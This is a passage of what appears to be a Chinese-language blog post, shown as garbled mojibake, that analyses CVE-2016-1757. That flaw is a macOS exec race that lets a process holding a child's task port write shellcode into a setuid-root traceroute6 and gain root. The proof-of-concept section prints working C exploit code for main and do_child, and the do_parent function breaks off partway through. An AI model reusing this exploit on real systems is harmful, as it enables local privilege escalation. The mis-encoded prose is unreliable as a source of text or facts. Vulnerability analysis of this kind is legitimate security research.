<a id="more"></a>
<h1 id="0x01_åŸºç¡€çŸ¥è¯†">0x01 åŸºç¡€çŸ¥è¯†</h1><h2 id="1-1_execå‡½æ•°æµç¨‹">1.1 execå‡½æ•°æµç¨‹</h2><p>æˆ‘åœ¨<a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSXå†…æ ¸åŠ è½½mach-oæµç¨‹åˆ†æ</a>ä¸­æ¯”è¾ƒè¯¦ç»†çš„åˆ†æäº†<code>exec</code>æ•´ä¸ªæ‰§è¡Œæµç¨‹ä¸­æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªæ˜¯æ¯”è¾ƒç²¾ç®€çš„ä¸€ä¸ªæµç¨‹å›¾ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="execå‡½æ•°å›¾"></p>
<h1 id="1-2_mach_vm_*_API">1.2 mach_vm_* API</h1><p><code>Mach</code>æä¾›äº†ä¸€ç§ç”¨æˆ·å±‚å¯¹è™šæ‹Ÿå†…å­˜çš„æ“ä½œæ–¹å¼ã€‚ä¸€ç³»åˆ—å¯¹<code>vm_map_t</code>ä½œå‡ºæ“ä½œçš„<code>API</code>å¯ä»¥å¯¹è™šæ‹Ÿå†…å­˜ä½œå‡ºå¾ˆå¤šæ“ä½œã€‚è¿™é‡Œçš„<code>vm_map_t</code>å°±æ˜¯<code>PORT</code>ã€‚</p>
<p>è¿™ä¸€ç³»åˆ—çš„APIæœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªæ˜¯ç®€å•çš„ä»‹ç»ä¸€ä¸‹POCä¸­ä¼šä½¿ç”¨åˆ°çš„APIã€‚</p>
<h3 id="1-2-1_mach_vm_allocate">1.2.1 mach_vm_allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mach_vm_allocate(<span class="keyword">vm_map_t</span> <span class="built_in">map</span>,<span class="keyword">mach_vm_address_t</span> *address,<span class="keyword">mach_vm_size_t</span> size,<span class="keyword">int</span> flags);</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>map</code>ä¸­åˆ†é…<code>size</code>ä¸ªå­—èŠ‚å¤§å°çš„å†…å­˜ï¼Œæ ¹æ®<code>flags</code>çš„ä¸åŒä¼šæœ‰ä¸åŒçš„å¤„ç†æ–¹å¼ã€‚<code>address</code>æ˜¯ä¸€ä¸ª<code>I/O</code>çš„å‚æ•°ï¼ˆä¾‹å¦‚ï¼šè·å–åˆ†é…åçš„å†…å­˜å¤§å°ï¼‰ã€‚</p>
<p>å¦‚æœ<code>flags</code>çš„å€¼ä¸æ˜¯<code>VM_FLAGS_ANYWHERE</code>ï¼Œé‚£ä¹ˆå†…å­˜å°†è¢«åˆ†é…åˆ°<code>address</code>æŒ‡å‘çš„åœ°å€ã€‚                                                            </p>
<h3 id="1-2-2_mach_vm_region">1.2.2 mach_vm_region</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_region(</span><br><span class="line">	<span class="keyword">vm_map_t</span>		 <span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	*address,		<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_vm_size_t</span>	*size,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">vm_region_flavor_t</span>	 flavor,		<span class="comment">/* IN */</span></span><br><span class="line">	<span class="keyword">vm_region_info_t</span>	 info,			<span class="comment">/* OUT */</span></span><br><span class="line">	<span class="keyword">mach_msg_type_number_t</span>	*count,			<span class="comment">/* IN/OUT */</span></span><br><span class="line">	<span class="keyword">mach_port_t</span>		*object_name)		<span class="comment">/* OUT */</span></span><br></pre></td></tr></table></figure>
<p>è·å–<code>map</code>æŒ‡å‘çš„ä»»åŠ¡å†…ï¼Œ<code>address</code>åœ°å€èµ·å§‹çš„VM regionï¼ˆè™šæ‹Ÿå†…å­˜åŒºåŸŸï¼‰çš„ä¿¡æ¯ã€‚ç›®å‰æ ‡è®°ä¸º<code>flavor</code>åªæœ‰<code>VM_BASIC_INFO_64</code>ã€‚            </p>
<p>è·å¾—çš„infoçš„æ•°æ®ç»“æ„å¦‚ä¸‹ã€‚                                                </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm_region_basic_info_64 &#123;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		protection;</span><br><span class="line">	<span class="keyword">vm_prot_t</span>		max_protection;</span><br><span class="line">	<span class="keyword">vm_inherit_t</span>		inheritance;</span><br><span class="line">	<span class="keyword">boolean_t</span>		shared;</span><br><span class="line">	<span class="keyword">boolean_t</span>		reserved;</span><br><span class="line">	<span class="keyword">memory_object_offset_t</span>	offset;</span><br><span class="line">	<span class="keyword">vm_behavior_t</span>		behavior;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		user_wired_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-3_mach_vm_protect">1.2.3 mach_vm_protect</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_protect(</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> task,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span> address,</span><br><span class="line">	<span class="keyword">mach_vm_size_t</span> size,</span><br><span class="line">	<span class="keyword">boolean_t</span> set_maximum,</span><br><span class="line">	<span class="keyword">vm_prot_t</span> new_protection)</span><br></pre></td></tr></table></figure>
<p>å¯¹<code>address</code>åˆ°<code>address+size</code>è¿™ä¸€æ®µçš„å†…å­˜è®¾ç½®å†…å­˜ä¿æŠ¤ç­–ç•¥,<code>new_protection</code>å°±æ˜¯æœ€åè®¾ç½®æˆä¸ºçš„ä¿æŠ¤æœºåˆ¶ã€‚</p>
<h3 id="1-2-4_mach_vm_write">1.2.4 mach_vm_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_vm_write(</span><br><span class="line">	<span class="keyword">vm_map_t</span>			<span class="built_in">map</span>,</span><br><span class="line">	<span class="keyword">mach_vm_address_t</span>		address,</span><br><span class="line">	<span class="keyword">pointer_t</span>			data,</span><br><span class="line">	__unused <span class="keyword">mach_msg_type_number_t</span>	size)</span><br></pre></td></tr></table></figure>
<p>å¯¹<code>address</code>æŒ‡å‘çš„å†…å­˜æ”¹å†™å†…å®¹ã€‚</p>
<h1 id="1-3_Ports">1.3 Ports</h1><p><code>Ports</code>æ˜¯ä¸€ç§<code>Mach</code>æä¾›çš„<code>task</code>ä¹‹é—´ç›¸äº’äº¤äº’çš„æœºåˆ¶ï¼Œé€šè¿‡<code>Ports</code>å¯ä»¥å®Œæˆç±»ä¼¼è¿›ç¨‹é—´é€šä¿¡çš„è¡Œä¸ºã€‚æ¯ä¸ª<code>Ports</code>éƒ½ä¼šæœ‰è‡ªå·±çš„æƒé™ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND		((mach_port_right_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_RECEIVE		((mach_port_right_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE	((mach_port_right_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_PORT_SET	((mach_port_right_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME	((mach_port_right_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_LABELH	        ((mach_port_right_t) <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_NUMBER		((mach_port_right_t) <span class="number">6</span>)</span></span><br></pre></td></tr></table></figure>
<p><code>Ports</code>å¯ä»¥åœ¨ä¸åŒçš„<code>task</code>ä¹‹é—´ä¼ é€’ï¼Œé€šè¿‡ä¼ é€’å¯ä»¥èµ‹äºˆå…¶ä»–<code>task</code>å¯¹<code>ports</code>çš„æ“ä½œæƒé™ã€‚ä¾‹å¦‚POCä¸­ä½¿ç”¨çš„å°±æ˜¯åœ¨çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¹‹é—´ä¼ é€’<code>Port</code>å¾—åˆ°äº†å¯¹å†…å­˜æ“ä½œçš„æƒé™ã€‚</p>
<h1 id="0x02_æ¼æ´åŸç†">0x02 æ¼æ´åŸç†</h1><p>â€‹    åœ¨å†…æ ¸å¤„ç†setuidçš„ç¨‹åºæ—¶å­˜åœ¨ä¸€ä¸ªæ—¶é—´çª—å£ï¼Œé€šè¿‡è¿™ä¸ªæ—¶é—´çª—å£ï¼Œåœ¨è¿›ç¨‹<code>Port</code>è¢«å…³é—­ä¹‹å‰ï¼Œæ‹¥æœ‰è¿›ç¨‹<code>Port</code>çš„ç¨‹åºå¯ä»¥æ”¹å†™ç›®æ ‡è¿›ç¨‹çš„ä»»æ„å†…å­˜ï¼Œé€šè¿‡æ”¹å†™å†…å­˜å¯ä»¥åˆ©ç”¨ç›®æ ‡è¿›ç¨‹çš„rootæƒé™æ‰§è¡Œä»»æ„çš„shellcodeã€‚</p>
<h2 id="2-1_execvæµç¨‹æ¼æ´">2.1 execvæµç¨‹æ¼æ´</h2><p><img src="https://2.bp.blogspot.com/-lw-AyicBVT0/VvGCDuX_AZI/AAAAAAAABRk/sjk9rPkkGhMsrNI6ZkVxNexTffskLBs0Q/s1600/2016-03-22_2.png" alt="æµç¨‹å›¾"><br><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-4_load_machfile">load_machfileæºç åˆ†æ</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#1-3_exec_mach_imgact">exec_mach_imgactæºç åˆ†æ</a></p>
<p>åœ¨swap_task_mapä»¥åŠexec_handle_suidä¹‹é—´æœ‰ä¸€ä¸ªæ—¶é—´çª—å£ï¼Œtask portè¿˜æ˜¯å¯ä»¥å¯¹å†…å­˜åšå‡ºä¿®æ”¹çš„ã€‚</p>
<p>å…·ä½“ç»†èŠ‚å¯ä»¥å‚è€ƒpocï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å‚è€ƒæºç çš„åˆ†ææ—¥å¿—ã€‚</p>
<h3 id="2-2_æ•è·æ—¶é—´çª—å£(çµçŠ€ä¸€æŒ‡)">2.2 æ•è·æ—¶é—´çª—å£(çµçŠ€ä¸€æŒ‡)</h3><p>â€‹    æ—¶é—´çª—å£æ‰“å¼€çš„æ—¶æœºå¯¹ç¼–å†™pocéå¸¸é‡è¦ï¼Œå› ä¸ºåœ¨è°ƒç”¨execä¹‹åæ•´ä¸ªè¡Œä¸ºéƒ½æ˜¯å†…æ ¸æ§åˆ¶çš„ï¼Œæ²¡æœ‰ä»€ä¹ˆç›´æ¥çš„åŠæ³•è·å–æ—¶é—´çª—å£ï¼Œpocä¸­æä¾›çš„æ–¹æ³•æ˜¯é€šè¿‡ä¸æ–­çš„è°ƒç”¨<code>mach_vm_region</code>ï¼Œå½“çª—å£å‡ºç°æ—¶ï¼Œä¹Ÿå°±æ˜¯ä»old_mapåˆ‡æ¢åˆ°new_mapæ—¶ï¼Œ<code>mach_vm_region</code>å‡½æ•°è·å–çš„addressåº”è¯¥æ˜¯ä¸åŒçš„ã€‚å…·ä½“å®ç°åœ¨ä¸‹é¢çš„pocæºç åˆ†æä¸­ä¼šæåˆ°ã€‚</p>
<h3 id="2-3_ä»»æ„å†…å­˜å†™">2.3 ä»»æ„å†…å­˜å†™</h3><p>â€‹    åœ¨å¾—åˆ°çª—å£æ‰“å¼€çš„æ—¶æœºä¹‹åé€šè¿‡ä¸Šé¢æåˆ°çš„portä»¥åŠmach_vm_*çš„ä¸€ç³»åˆ—å‡½æ•°å°±å¯ä»¥åšåˆ°å¯¹ç›®æ ‡è¿›ç¨‹çš„ä»»æ„å†™æ“ä½œï¼Œä»è€Œå†™å…¥shellcodeã€‚</p>
<h3 id="2-4_shellcodeçš„æ‰§è¡Œ(ç§»èŠ±æ¥æœ¨)">2.4 shellcodeçš„æ‰§è¡Œ(ç§»èŠ±æ¥æœ¨)</h3><p>â€‹    shellcodeè¦å†™åœ¨ä»€ä¹ˆåœ°æ–¹æ‰ä¼šè¢«æ‰§è¡Œå‘¢ï¼Ÿ    </p>
<p>â€‹    é€šè¿‡å¯¹traceroute6çš„åˆ†æï¼Œå¯ä»¥çœ‹åˆ°__textçš„åœ°å€åç§»æ˜¯0x153cï¼Œæ‰€ä»¥é€šè¿‡å¯¹è¯¥åœ°å€çš„å†…å­˜æ”¹å†™ï¼Œå¯ä»¥ä½¿å¾—shellcodeå¾—åˆ°æ‰§è¡Œã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/shellcode.png" alt="traceroute6"></p>
<h1 id="0x03_POCæºç åˆ†æ">0x03 POCæºç åˆ†æ</h1><h2 id="3-1_main">3.1 main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// register a name with launchd</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//åˆ›å»ºä¸€ä¸ªå…·æœ‰æ¥å—æ¶ˆæ¯æƒé™çš„port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't allocate service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//ä¸ºportæ·»åŠ SENDæƒé™</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               service_port,</span><br><span class="line">                               service_port,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't insert make send right"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// æ³¨å†Œä¸€ä¸ªå…¨å±€çš„Port</span></span><br><span class="line">  <span class="comment">// ä¹‹åçš„å­è¿›ç¨‹ä¼šç»§æ‰¿è¿™ä¸ªport</span></span><br><span class="line">  err = bootstrap_register(bootstrap_port, service_name, service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"can't register service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[+] registered service \"%s\" with launchd to receive child thread port\n"</span>, service_name);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fork a child</span></span><br><span class="line">  <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">  <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">    do_child();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_parent(service_port);</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mainå‡½æ•°åœ¨å»ºç«‹äº†portä¹‹åä¹‹åforkå‡ºå­ç¨‹åºï¼Œå¼€å§‹åšå„è‡ªåšçš„äº‹æƒ…ã€‚</p>
<h2 id="3-2_do_child">3.2 do_child</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_child</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//æŸ¥æ‰¾å…¨å±€çš„port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</span><br><span class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get bootstrap port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">mach_port_t</span> service_port;</span><br><span class="line">  err = bootstrap_look_up(bootstrap_port, service_name, &amp;service_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child can't get service port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a reply port:</span></span><br><span class="line">  <span class="comment">// åˆ›å»ºä¸€ä¸ªå…·æœ‰æ¥å—æ¶ˆæ¯æƒé™çš„port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to allocate reply port"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send it our task port</span></span><br><span class="line">  <span class="comment">// å°†å­è¿›ç¨‹çš„portå‘é€ç»™çˆ¶è¿›ç¨‹</span></span><br><span class="line">  <span class="keyword">task_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = service_port;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  msg.port.name = mach_task_self();</span><br><span class="line">  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to send thread port message"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a reply to ack that the other end got our thread port</span></span><br><span class="line">  <span class="comment">// ç­‰å¾…çˆ¶è¿›ç¨‹å›å¤</span></span><br><span class="line">  <span class="keyword">ack_msg_recv_t</span> reply = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;reply.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">    mach_error(<span class="string">"child unable to receive ack"</span>, err);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// exec the suid-root binary</span></span><br><span class="line">  <span class="comment">// æ‰§è¡Œsetuidçš„ç¨‹åºtraceroute6</span></span><br><span class="line">  <span class="keyword">char</span>* argv[] = &#123;suid_binary_path, <span class="string">"-w"</span>, <span class="string">"rofl"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span>* envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(suid_binary_path, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å­è¿›ç¨‹åšçš„äº‹æƒ…ä¹Ÿéå¸¸çš„ç®€å•ï¼Œå°†è‡ªå·±çš„portå‘é€ç»™çˆ¶è¿›ç¨‹ï¼Œç¡®ä¿çˆ¶è¿›ç¨‹å·²ç»è·å–åˆ°portä¹‹åï¼Œæ‰§è¡Œsetuidçš„ç¨‹åºï¼Œpocä¸­ä½¿ç”¨çš„æ˜¯traceroute6ã€‚</p>
<h2 id="3-3_do_parent">3.3  do_parent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_parent</span><span class="params">(mach_port_t service_port)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// generate the page we want to write into the child:</span></span><br><span class="line">  <span class="comment">// 